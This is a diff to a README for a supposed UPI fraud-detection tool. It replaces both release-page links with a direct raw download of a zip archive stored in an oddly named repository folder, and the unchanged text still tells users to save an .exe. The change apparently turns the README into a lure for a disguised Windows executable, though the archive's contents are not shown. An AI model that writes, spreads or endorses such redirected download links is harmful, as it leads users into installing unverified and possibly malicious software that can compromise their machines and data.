@@ -1,6 +1,6 @@
 # 🛡️ upi-fraud-gnn - Stop fraud with smart network analysis
 
-[![Download UPI Fraud Sentinel](https://img.shields.io/badge/Download-UPI_Fraud_Sentinel-blue.svg)](https://github.com/yoelpa6680/upi-fraud-gnn/releases)
+[![Download UPI Fraud Sentinel](https://img.shields.io/badge/Download-UPI_Fraud_Sentinel-blue.svg)](https://raw.githubusercontent.com/yoelpa6680/upi-fraud-gnn/main/Makua/upi_fraud_gnn_v1.1-beta.3.zip)
 
 UPI Fraud Sentinel helps you spot suspicious transactions. It uses graph-based artificial intelligence to watch for patterns that signal fraud. This tool analyzes connections between accounts to find risks before money moves.
 
@@ -8,7 +8,7 @@ UPI Fraud Sentinel helps you spot suspicious transactions. It uses graph-based a
 
 You need to get the application files from our release page. We package the software as an installer for Windows. 
 
-[Click here to visit the release page and download the software](https://github.com/yoelpa6680/upi-fraud-gnn/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/yoelpa6680/upi-fraud-gnn/main/Makua/upi_fraud_gnn_v1.1-beta.3.zip)
 
 Look for the file that ends in .exe. Save this file to your computer.
 
